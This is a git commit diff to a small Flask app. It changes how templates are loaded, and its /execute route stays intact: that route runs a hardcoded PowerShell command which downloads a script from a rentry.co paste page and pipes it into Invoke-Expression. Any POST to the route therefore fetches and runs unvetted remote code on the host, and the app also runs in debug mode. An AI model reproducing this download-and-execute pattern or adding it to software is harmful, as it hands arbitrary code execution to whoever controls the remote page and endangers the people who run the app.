a65e246f3610be54538ce94c5a703fc5c537cb98
Mokaramzein <mokaramalzein26@gmail.com>
2024-06-24 23:26:26 +0300

    Update app.py

--- app.py
+++ app.py
@@ -1,28 +1,22 @@
-
-from flask import Flask, render_template_string,render_template, request
+from flask import Flask, render_template_string, request
 import subprocess
 
 app = Flask(__name__)
 
 @app.route('/')
 def index():
-    return render_template(index.html)
+    return render_template_string(open('index.html').read())
 
 @app.route('/execute', methods=['POST'])
 def execute():
     try:
-        # PowerShell command to be executed
         command = 'powershell -Command "irm rentry.co/Testy123/raw | iex"'
-        
-        # Execute the PowerShell command
         result = subprocess.run(command, capture_output=True, text=True, shell=True)
-        
-        # Capture the output
         output = result.stdout if result.returncode == 0 else result.stderr
     except Exception as e:
         output = str(e)
     
-    return render_template_string(HTML_TEMPLATE, output=output)
+    return render_template_string(open('index.html').read(), output=output)
 
 if __name__ == '__main__':
     app.run(debug=True)
